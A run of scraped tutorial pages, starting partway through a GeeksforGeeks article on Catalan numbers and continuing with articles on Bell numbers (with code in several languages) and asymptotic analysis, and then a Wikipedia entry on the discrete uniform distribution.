(i+1)=70/5=14 Pseudocode: a) initially set cat_=1 and print it b) run a for loop i=1 to i<=n cat_ *= (4*i-2) cat_ /= (i+1) print cat_ c) end loop and exit C++ filter_none edit close play_arrow link brightness_4 code #include <bits/stdc++.h> #include <boost/multiprecision/cpp_int.hpp> using boost::multiprecision::cpp_int; using namespace std; // Function to print the number void catalan(int n) { cpp_int cat_ = 1; // For the first number cout << cat_ << " "; // C(0) // Iterate till N for (cpp_int i = 1; i < n; i++) { // Calculate the number // and print it cat_ *= (4 * i - 2); cat_ /= (i + 1); cout << cat_ << " "; } } // Driver code int main() { int n = 5; // Function call catalan(n); return 0; } chevron_right filter_none Output 1 1 2 5 14 Time Complexity: O(n)Auxiliary Space: O(1) Another solution using BigInteger in java: Finding values of catalan numbers for N>80 is not possible even by using long in java, so we use BigInteger Here we find solution using Binomial Coefficient method as discussed above Java filter_none edit close play_arrow link brightness_4 code import java.io.*; import java.util.*; import java.math.*; class GFG { public static BigInteger findCatalan(int n) { // using BigInteger to calculate large factorials BigInteger b = new BigInteger("1"); // calculating n! for (int i = 1; i <= n; i++) { b = b.multiply(BigInteger.valueOf(i)); } // calculating n! * n! b = b.multiply(b); BigInteger d = new BigInteger("1"); // calculating (2n)! for (int i = 1; i <= 2 * n; i++) { d = d.multiply(BigInteger.valueOf(i)); } // calculating (2n)! / (n! * n!) BigInteger ans = d.divide(b); // calculating (2n)! / ((n! * n!) * (n+1)) ans = ans.divide(BigInteger.valueOf(n + 1)); return ans; } // Driver Code public static void main(String[] args) { int n = 5; System.out.println(findCatalan(n)); } } // Contributed by Rohit Oberoi chevron_right filter_none Output 42 References: http://en.wikipedia.org/wiki/Catalan_number Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Program for nth Fuss–Catalan NumberTotal number of possible Binary Search Trees using Catalan NumberApplications of Catalan NumbersMinimum changes required to make a Catalan SequenceProgram to find last two digits of Nth Fibonacci numberProgram to find the nth Kynea numberProgram to find the Nth Harmonic NumberProgram to find the Nth number of the series 2, 10, 24, 44, 70.....Program to delete Nth digit of a NumberProgram to find the Nth Prime NumberProgram to find Nth odd Fibonacci NumberProgram to find the Nth natural number with exactly two bits set | Set 2Number of digits in the nth number made of given four digitsFind Nth number in a sequence which is not a multiple of a given numberProgram to print the sum of the given nth termProgram to get the Sum of series: 1 - x^2/2! + x^4/4! -.... upto nth termProgram to find Nth term in the given SeriesProgram to find the Nth term of the series 3, 7, 13, 21, 31.....Program to find Nth term of series 1, 3, 12, 60, 360…Program to find the Nth term of series -1, 2, 11, 26, 47......Improved By : icr0, jit_t, nitin mittal, vt_m, soumya7, more 29AjayKumar, Harshit Singhal 2, ankthon, Akanksha_Rai, Chandan_Kumar, Rajput-Ji, anantiitrk, ankit_deshmukh, madhav_mohan, RohitOberoi Article Tags : Dynamic ProgrammingMathematicalMiscAmazoncatalanseries Practice Tags : AmazonMiscDynamic ProgrammingMiscMathematicalseries thumb_up 79 To-do Done 2.6 Based on 130 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Remove minimum elements from either side such that 2*min becomes more than max Next last_page Count trailing zeroes in factorial of a number Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Dynamic Programming Partition problem | DP-18Bellman–Ford Algorithm | DP-23Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Floyd Warshall Algorithm | DP-16Matrix Chain Multiplication | DP-8 Most visited in Mathematical C++ Data TypesProgram for factorial of a numberWrite a program to print all permutations of a given stringSet in C++ Standard Template Library (STL)Prime Numbers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Bell Numbers (Number of ways to Partition a Set) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Program for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationReverse an array in groups of given sizeK’th Smallest/Largest Element in Unsorted Array | Set 1K’th Smallest/Largest Element in Unsorted Array | Set 2 (Expected Linear Time)K’th Smallest/Largest Element in Unsorted Array | Set 3 (Worst Case Linear Time)K’th Smallest/Largest Element using STLk largest(or smallest) elements in an array | added Min Heap methodSort a nearly sorted (or K sorted) arrayMerge k sorted arrays | Set 1Largest Sum Contiguous Subarray0-1 Knapsack Problem | DP-10Longest Common Subsequence | DP-4Longest Increasing Subsequence | DP-3Subset Sum Problem | DP-25Longest Palindromic Substring | Set 1Sieve of EratosthenesTop 20 Dynamic Programming Interview Questions Bell Numbers (Number of ways to Partition a Set) Last Updated: 27-04-2018 Given a set of n elements, find number of ways of partitioning it. Examples: Input: n = 2 Output: Number of ways = 2 Explanation: Let the set be {1, 2} { {1}, {2} } { {1, 2} } Input: n = 3 Output: Number of ways = 5 Explanation: Let the set be {1, 2, 3} { {1}, {2}, {3} } { {1}, {2, 3} } { {2}, {1, 3} } { {3}, {1, 2} } { {1, 2, 3} }. Solution to above questions is Bell Number. What is a Bell Number? Let S(n, k) be total number of partitions of n elements into k sets. The value of n’th Bell Number is sum of S(n, k) for k = 1 to n. Value of S(n, k) can be defined recursively as, S(n+1, k) = k*S(n, k) + S(n, k-1) How does above recursive formula work? When we add a (n+1)’th element to k partitions, there are two possibilities. 1) It is added as a single element set to existing partitions, i.e, S(n, k-1) 2) It is added to all sets of every partition, i.e., k*S(n, k) S(n, k) is called Stirling numbers of the second kind First few Bell numbers are 1, 1, 2, 5, 15, 52, 203, …. A Simple Method to compute n’th Bell Number is to one by one compute S(n, k) for k = 1 to n and return sum of all computed values. Refer this for computation of S(n, k). A Better Method is to use Bell Triangle. Below is a sample Bell Triangle for first few Bell Numbers. 1 1 2 2 3 5 5 7 10 15 15 20 27 37 52 The triangle is constructed using below formula. // If this is first column of current row 'i' If j == 0 // Then copy last entry of previous row // Note that i'th row has i entries Bell(i, j) = Bell(i-1, i-1) // If this is not first column of current row Else // Then this element is sum of previous element // in current row and the element just above the // previous element Bell(i, j) = Bell(i-1, j-1) + Bell(i, j-1) Interpretation Then Bell(n, k) counts the number of partitions of the set {1, 2, …, n + 1} in which the element k + 1 is the largest element that can be alone in its set. For example, Bell(3, 2) is 3, it is count of number of partitions of {1, 2, 3, 4} in which 3 is the largest singleton element. There are three such partitions: {1}, {2, 4}, {3} {1, 4}, {2}, {3} {1, 2, 4}, {3}. Below is Dynamic Programming based implementation of above recursive formula. C++ filter_none edit close play_arrow link brightness_4 code // A C++ program to find n'th Bell number #include<iostream> using namespace std; int bellNumber(int n) { int bell[n+1][n+1]; bell[0][0] = 1; for (int i=1; i<=n; i++) { // Explicitly fill for j = 0 bell[i][0] = bell[i-1][i-1]; // Fill for remaining values of j for (int j=1; j<=i; j++) bell[i][j] = bell[i-1][j-1] + bell[i][j-1]; } return bell[n][0]; } // Driver program int main() { for (int n=0; n<=5; n++) cout << "Bell Number " << n << " is " << bellNumber(n) << endl; return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program to find n'th Bell number import java.io.*; class GFG { // Function to find n'th Bell Number static int bellNumber(int n) { int[][] bell = new int[n+1][n+1]; bell[0][0] = 1; for (int i=1; i<=n; i++) { // Explicitly fill for j = 0 bell[i][0] = bell[i-1][i-1]; // Fill for remaining values of j for (int j=1; j<=i; j++) bell[i][j] = bell[i-1][j-1] + bell[i][j-1]; } return bell[n][0]; } // Driver program public static void main (String[] args) { for (int n=0; n<=5; n++) System.out.println("Bell Number "+ n + " is "+bellNumber(n)); } } // This code is contributed by Pramod Kumar chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # A Python program to find n'th Bell number def bellNumber(n): bell = [[0 for i in range(n+1)] for j in range(n+1)] bell[0][0] = 1 for i in range(1, n+1): # Explicitly fill for j = 0 bell[i][0] = bell[i-1][i-1] # Fill for remaining values of j for j in range(1, i+1): bell[i][j] = bell[i-1][j-1] + bell[i][j-1] return bell[n][0] # Driver program for n in range(6): print('Bell Number', n, 'is', bellNumber(n)) # This code is contributed by Soumen Ghosh chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# program to find n'th Bell number using System; class GFG { // Function to find n'th // Bell Number static int bellNumber(int n) { int[,] bell = new int[n + 1, n + 1]; bell[0, 0] = 1; for (int i = 1; i <= n; i++) { // Explicitly fill for j = 0 bell[i, 0] = bell[i - 1, i - 1]; // Fill for remaining values of j for (int j = 1; j <= i; j++) bell[i, j] = bell[i - 1, j - 1] + bell[i, j - 1]; } return bell[n, 0]; } // Driver Code public static void Main () { for (int n = 0; n <= 5; n++) Console.WriteLine("Bell Number "+ n + " is "+bellNumber(n)); } } // This code is contributed by nitin mittal. chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // A PHP program to find // n'th Bell number // function that returns // n'th bell number function bellNumber($n) { $bell[0][0] = 1; for ($i = 1; $i <= $n; $i++) { // Explicitly fill for j = 0 $bell[$i][0] = $bell[$i - 1] [$i - 1]; // Fill for remaining // values of j for ($j = 1; $j <= $i; $j++) $bell[$i][$j] = $bell[$i - 1][$j - 1] + $bell[$i][$j - 1]; } return $bell[$n][0]; } // Driver Code for ($n = 0; $n <= 5; $n++) echo("Bell Number " . $n . " is " . bellNumber($n) . "\n"); // This code is contributed by Ajit. ?> chevron_right filter_none Output: Bell Number 0 is 1 Bell Number 1 is 1 Bell Number 2 is 2 Bell Number 3 is 5 Bell Number 4 is 15 Bell Number 5 is 52 Time Complexity of above solution is O(n2). We will soon be discussing other more efficient methods of computing Bell Numbers. Another problem that can be solved by Bell Numbers. A number is squarefree if it is not divisible by a perfect square other than 1. For example, 6 is a square free number but 12 is not as it is divisible by 4. Given a squarefree number x, find the number of different multiplicative partitions of x. The number of multiplicative partitions is Bell(n) where n is number of prime factors of x. For example x = 30, there are 3 prime factors of 2, 3 and 5. So the answer is Bell(3) which is 5. The 5 partitions are 1 x 30, 2 x15, 3 x 10, 5 x 6 and 2 x 3 x 5. Exercise: The above implementation causes arithmetic overflow for slightly larger values of n. Extend the above program so that results are computed under modulo 1000000007 to avoid overflows. Reference: https://en.wikipedia.org/wiki/Bell_number https://en.wikipedia.org/wiki/Bell_triangle This article is contributed by Rajeev Agrawal. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Lynch-Bell NumbersCount number of ways to partition a set into k subsetsNumber of ways to partition a string into two balanced subsequencesCount ways to partition a string such that both parts have equal distinct charactersClosest sum partition (into two subsets) of numbers from 1 to nNumber of ways to obtain each numbers in range [1, b+c] by adding any two numbers in range [a, b] and [b, c]Print equal sum sets of array (Partition problem) | Set 1Print equal sum sets of array (Partition Problem) | Set 2Partition of a set into K subsets with equal sum using BitMask and DPPartition a set into two subsets such that difference between max of one and min of other is minimizedPartition a set into two non-empty subsets such that the difference of subset sums is maximumThe painter's partition problem | Set 2Partition a set into two subsets such that the difference of subset sums is minimumPartition a number into two divisible partsPartition array into minimum number of equal length subsets consisting of a single distinct valueNumber of ways to represent a number as sum of k fibonacci numbersMinimum toggles to partition a binary array so that it has first 0s then 1sMaximum average sum partition of an arrayPartition N into M parts such that difference between Max and Min part is smallestPartition an array of non-negative integers into two subsets such that average of both the subsets is equalImproved By : nitin mittal, jit_t Article Tags : Dynamic ProgrammingMathematicalsubset Practice Tags : Dynamic ProgrammingMathematicalsubset thumb_up 40 To-do Done 3.3 Based on 90 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find the most frequent digit without using array/string Next last_page Check if a given number is Fancy Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Dynamic Programming Partition problem | DP-18Bellman–Ford Algorithm | DP-23Travelling Salesman Problem | Set 1 (Naive and Dynamic Programming)Floyd Warshall Algorithm | DP-16Matrix Chain Multiplication | DP-8 Most visited in Mathematical C++ Data TypesSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given stringProgram for factorial of a numberProgram to find GCD or HCF of two numbers room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 1 (Asymptotic Analysis) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortComplexity of different operations in Binary tree, Binary Search Tree and AVL tree Analysis of Algorithms | Set 1 (Asymptotic Analysis) Last Updated: 09-11-2020 Why performance analysis? There are many important things that should be taken care of, like user friendliness, modularity, security, maintainability, etc. Why to worry about performance? The answer to this is simple, we can have all the above things only if we have performance. So performance is like currency through which we can buy all the above things. Another reason for studying performance is – speed is fun! To summarize, performance == scale. Imagine a text editor that can load 1000 pages, but can spell check 1 page per minute OR an image editor that takes 1 hour to rotate your image 90 degrees left OR … you get it. If a software feature can not cope with the scale of tasks users need to perform – it is as good as dead. Given two algorithms for a task, how do we find out which one is better? One naive way of doing this is – implement both the algorithms and run the two programs on your computer for different inputs and see which one takes less time. There are many problems with this approach for analysis of algorithms. 1) It might be possible that for some inputs, first algorithm performs better than the second. And for some inputs second performs better. 2) It might also be possible that for some inputs, first algorithm perform better on one machine and the second works better on other machine for some other inputs. Asymptotic Analysis is the big idea that handles above issues in analyzing algorithms. In Asymptotic Analysis, we evaluate the performance of an algorithm in terms of input size (we don’t measure the actual running time). We calculate, how the time (or space) taken by an algorithm increases with the input size. For example, let us consider the search problem (searching a given item) in a sorted array. One way to search is Linear Search (order of growth is linear) and the other way is Binary Search (order of growth is logarithmic). To understand how Asymptotic Analysis solves the above mentioned problems in analyzing algorithms, let us say we run the Linear Search on a fast computer A and Binary Search on a slow computer B and we pick the constant values for the two computers so that it tells us exactly how long it takes for the given machine to perform the search in seconds. Let’s say the constant for A is 0.2 and the constant for B is 1000 which means that A is 5000 times more powerful than B. For small values of input array size n, the fast computer may take less time. But, after a certain value of input array size, the Binary Search will definitely start taking less time compared to the Linear Search even though the Binary Search is being run on a slow machine. The reason is the order of growth of Binary Search with respect to input size is logarithmic while the order of growth of Linear Search is linear. So the machine dependent constants can always be ignored after a certain value of input size. Here are some running times for this example: Linear Search running time in seconds on A: 0.2 * n Binary Search running time in seconds on B: 1000*log(n) ------------------------------------------------ |n | Running time on A | Running time on B | ------------------------------------------------- |10 | 2 sec | ~ 1 h | ------------------------------------------------- |100 | 20 sec | ~ 1.8 h | ------------------------------------------------- |10^6 | ~ 55.5 h | ~ 5.5 h | ------------------------------------------------- |10^9 | ~ 6.3 years | ~ 8.3 h | ------------------------------------------------- Does Asymptotic Analysis always work? Asymptotic Analysis is not perfect, but that’s the best way available for analyzing algorithms. For example, say there are two sorting algorithms that take 1000nLogn and 2nLogn time respectively on a machine. Both of these algorithms are asymptotically same (order of growth is nLogn). So, With Asymptotic Analysis, we can’t judge which one is better as we ignore constants in Asymptotic Analysis. Also, in Asymptotic analysis, we always talk about input sizes larger than a constant value. It might be possible that those large inputs are never given to your software and an algorithm which is asymptotically slower, always performs better for your particular situation. So, you may end up choosing an algorithm that is Asymptotically slower but faster for your software. Next – Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsProperties of Asymptotic NotationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : Danail Kozhuharov, biplab_prasad, BenceAment Article Tags : AnalysisArticles thumb_up 298 To-do Done 1.3 Based on 498 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Pure Functions Next last_page Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Discrete uniform distribution - Wikipedia Discrete uniform distribution From Wikipedia, the free encyclopedia (Redirected from Uniform distribution (discrete)) Jump to navigation Jump to search discrete uniform Probability mass functionn = 5 where n = b − a + 1 Cumulative distribution functionNotation U { a , b } {\displaystyle {\mathcal {U}}\{a,b\}} or u n i f { a , b } {\displaystyle \mathrm {unif} \{a,b\}} Parameters a , b {\displaystyle a,b} integers with b ≥ a {\displaystyle b\geq a} n = b − a + 1 {\displaystyle n=b-a+1} Support k ∈ { a , a + 1 , … , b − 1 , b } {\displaystyle k\in \{a,a+1,\dots ,b-1,b\}} PMF 1 n {\displaystyle {\frac {1}{n}}} CDF ⌊ k ⌋ − a + 1 n {\displaystyle {\frac {\lfloor k\rfloor -a+1}{n}}} Mean a + b 2 {\displaystyle {\frac {a+b}{2}}} Median a + b 2 {\displaystyle {\frac {a+b}{2}}} Mode N/AVariance ( b − a + 1 ) 2 − 1 12 {\displaystyle {\frac {(b-a+1)^{2}-1}{12}}} Skewness 0 {\displaystyle 0} Ex. kurtosis − 6 ( n 2 + 1 ) 5 ( n 2 − 1 ) {\displaystyle -{\frac {6(n^{2}+1)}{5(n^{2}-1)}}} Entropy ln ⁡ ( n ) {\displaystyle \ln(n)} MGF e a t − e ( b + 1 ) t n ( 1 − e t ) {\displaystyle {\frac {e^{at}-e^{(b+1)t}}{n(1-e^{t})}}} CF e i a t − e i ( b + 1 ) t n ( 1 − e i t ) {\displaystyle {\frac {e^{iat}-e^{i(b+1)t}}{n(1-e^{it})}}} PGF z a − z b + 1 n ( 1 − z ) {\displaystyle {\frac {z^{a}-z^{b+1}}{n(1-z)}}} In probability theory and statistics, the discrete uniform distribution is a symmetric probability distribution wherein a finite number of values are equally likely to be observed; every one of n values has equal probability 1/n. Another way of saying "discrete uniform distribution" would be "a known, finite number of outcomes equally likely to happen". A simple example of the discrete uniform distribution is throwing a fair die. The possible values are 1, 2, 3, 4, 5, 6, and each time the die is thrown the probability of a given score is 1/6. If two dice are thrown and their values added, the resulting distribution is no longer uniform because not all sums have equal probability. Although it is convenient to describe discrete uniform distributions over integers, such as this, one can also consider discrete uniform distributions over any finite set. For instance, a random permutation is a permutation generated uniformly from the permutations of a given length, and a uniform spanning tree is a spanning tree generated uniformly from the spanning trees of a given graph. The discrete uniform distribution itself is inherently non-parametric. It is convenient, however, to represent its values generally by all integers in an interval [a,b], so that a and b become the main parameters of the distribution (often one simply considers the interval [1,n] with the single parameter n). With these conventions, the cumulative distribution function (CDF) of the discrete uniform distribution can be expressed, for any k ∈ [a,b], as F ( k ; a , b ) = ⌊ k ⌋ − a + 1 b − a + 1 {\displaystyle F(k;a,b)={\frac {\lfloor k\rfloor -a+1}{b-a+1}}} Contents 1 Estimation of maximum 2 Random permutation 3 Properties 4 See also 5 References Estimation of maximum[edit] Main article: German tank problem This example is described by saying that a sample of k observations is obtained from a uniform distribution on the integers 1 , 2 , … , N {\displaystyle 1,2,\dotsc ,N} , with the problem being to estimate the unknown maximum N. This problem is commonly known as the German tank problem, following the application of maximum estimation to estimates of German tank production during World War II. The uniformly minimum variance unbiased (UMVU) estimator for the maximum is given by N ^ = k + 1 k m − 1 = m + m k − 1 {\displaystyle {\hat {N}}={\frac {k+1}{k}}m-1=m+{\frac {m}{k}}-1} where m is the sample maximum and k is the sample size, sampling without replacement.[1] This can be seen as a very simple case of maximum spacing estimation. This has a variance of[1] 1 k ( N − k ) ( N + 1 ) ( k + 2 ) ≈ N 2 k 2 for small samples k ≪ N {\displaystyle {\frac {1}{k}}{\frac {(N-k)(N+1)}{(k+2)}}\approx {\frac {N^{2}}{k^{2}}}{\text{ for small samples }}k\ll N} so a standard deviation of approximately N k {\displaystyle {\tfrac {N}{k}}} , the (population) average size of a gap between samples; compare m k {\displaystyle {\tfrac {m}{k}}} above. The sample maximum is the maximum likelihood estimator for the population maximum, but, as discussed above, it is biased. If samples are not numbered but are recognizable or markable, one can instead estimate population size via the capture-recapture method. Random permutation[edit] Main article: Random permutation See rencontres numbers for an account of the probability distribution of the number of fixed points of a uniformly distributed random permutation. Properties[edit] The family of uniform distributions over ranges of integers (with one or both bounds unknown) has a finite-dimensional sufficient statistic, namely the triple of the sample maximum, sample minimum, and sample size, but is not an exponential family of distributions, because the support varies with the parameters. For families whose support does not depend on the parameters, the Pitman–Koopman–Darmois theorem states that only exponential families have a sufficient statistic whose dimension is bounded as sample size increases. The uniform distribution is thus a simple example showing the limit of this theorem. See also[edit] Dirac delta distribution Uniform distribution (continuous) References[edit] ^ a b Johnson, Roger (1994), "Estimating the Size of a Population", Teaching Statistics, 16 (2 (Summer)): 50–52, CiteSeerX 10.1.1.385.5463, doi:10.1111/j.1467-9639.1994.tb00688.x vteProbability distributions (List)Discrete univariatewith finite support Benford Bernoulli beta-binomial binomial categorical hypergeometric Poisson binomial Rademacher soliton discrete uniform Zipf Zipf–Mandelbrot Discrete univariatewith infinite support beta negative binomial Borel Conway–Maxwell–Poisson discrete phase-type Delaporte extended negative binomial Flory–Schulz Gauss–Kuzmin geometric logarithmic negative binomial Panjer parabolic fractal Poisson Skellam Yule–Simon zeta Continuous univariatesupported on a bounded interval arcsine ARGUS Balding–Nichols Bates beta beta rectangular continuous Bernoulli Irwin–Hall Kumaraswamy logit-normal noncentral beta raised cosine reciprocal triangular U-quadratic uniform Wigner semicircle Continuous univariatesupported on a semi-infinite interval Benini Benktander 1st kind Benktander 2nd kind beta prime Burr chi-squared chi Dagum Davis exponential-logarithmic Erlang exponential F folded normal Fréchet gamma gamma/Gompertz generalized gamma generalized inverse Gaussian Gompertz half-logistic half-normal Hotelling's T-squared hyper-Erlang hyperexponential hypoexponential inverse chi-squared scaled inverse chi-squared inverse Gaussian inverse gamma Kolmogorov Lévy log-Cauchy log-Laplace log-logistic log-normal Lomax matrix-exponential Maxwell–Boltzmann Maxwell–Jüttner Mittag-Leffler Nakagami noncentral chi-squared noncentral F Pareto phase-type poly-Weibull Rayleigh relativistic Breit–Wigner Rice shifted Gompertz truncated normal type-2 Gumbel Weibull discrete Weibull Wilks's lambda Continuous univariatesupported on the whole real line Cauchy exponential power Fisher's z Gaussian q generalized normal generalized hyperbolic geometric stable Gumbel Holtsmark hyperbolic secant Johnson's SU Landau Laplace asymmetric Laplace logistic noncentral t normal (Gaussian) normal-inverse Gaussian skew normal slash stable Student's t type-1 Gumbel Tracy–Widom variance-gamma Voigt Continuous univariatewith support whose type varies generalized chi-squared generalized extreme value generalized Pareto Marchenko–Pastur q-exponential q-Gaussian q-Weibull shifted log-logistic Tukey lambda Mixed continuous-discrete univariate rectified Gaussian Multivariate (joint) Discrete Ewens multinomial Dirichlet-multinomial negative multinomial Continuous 